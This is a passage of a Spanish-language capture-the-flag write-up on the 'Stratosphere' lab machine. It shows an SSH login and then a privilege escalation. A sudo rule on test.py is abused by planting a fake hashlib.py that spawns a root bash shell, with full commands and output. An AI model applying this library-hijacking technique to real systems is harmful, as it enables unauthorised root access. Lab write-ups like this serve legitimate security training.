Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.64' (ECDSA) to the list of known hosts.
richard@10.10.10.64's password: 
Linux stratosphere 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u2 (2018-02-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 27 16:26:33 2018 from 10.10.14.2
richard@stratosphere:~$ whoami
richard
richard@stratosphere:~$
```

Ya estamos dentro de la máquina y podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, así que vamos a enumerar un poco el sistema.

```bash
richard@stratosphere:~$ id
uid=1000(richard) gid=1000(richard) groups=1000(richard),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),116(scanner)
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
richard@stratosphere:~$
```

Vemos que tenemos permisos de ejecución del programa `test.py`, así que vamos a echarle un ojo:

```python
#!/usr/bin/python3
import hashlib


def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()
```

Vemos que el programa solicita las palabras asociadas a los hashes que se tienen; sin embargo, esto no nos va a funcionar para escalar privilegios. Algo que debemos tener en cuenta es que el programa está haciendo uso de la libreria `hashlib`, por lo que vamos a echarle un ojo a las rutas:

```bash
richard@stratosphere:~$ python
Python 3.5.3 (default, Jan 19 2017, 14:11:04) 
[GCC 6.3.0 20170118] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages']
>>>
```

Vemos que el path comienza por `''`, lo que indica que las librerías o cualquier otro pograma en python a utilizar será buscado primeramente por el directorio actual de trabajo; así que podríamos crear un archivo `hashlib.py` en la ruta donde se encuentra el programa `test.py` y como **root** ejecuta el archivo, también ejecutará nuestro archivo (libreria) y no nos solicita contraseña `sudo /usr/bin/python3 /home/richard/test.py`.

```python
import subprocess

result = subprocess.run(['whoami'])
result.stdout
```

```bash
richard@stratosphere:~$ python3 test.py 
richard
Solve: 5af003e100c80923ec04d65933d382cb
^CTraceback (most recent call last):
  File "test.py", line 38, in <module>
    question()
  File "test.py", line 6, in question
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
KeyboardInterrupt
richard@stratosphere:~$ sudo /usr/bin/python3 /home/richard/test.py 
root
Solve: 5af003e100c80923ec04d65933d382cb
^CTraceback (most recent call last):
  File "/home/richard/test.py", line 38, in <module>
    question()
  File "/home/richard/test.py", line 6, in question
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
KeyboardInterrupt
richard@stratosphere:~$
```

Vemos que con el comando `sudo /usr/bin/python3 /home/richard/test.py` ejecutamos el programa temporalemente como **root**; así que podríamos mandarnos una `bash`:

```python
import subprocess

result = subprocess.run(['bash'])
result.stdout
```

```bash
richard@stratosphere:~$ sudo /usr/bin/python3 /home/richard/test.py 
root@stratosphere:/home/richard# whoami
root
root@stratosphere:/home/richard#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
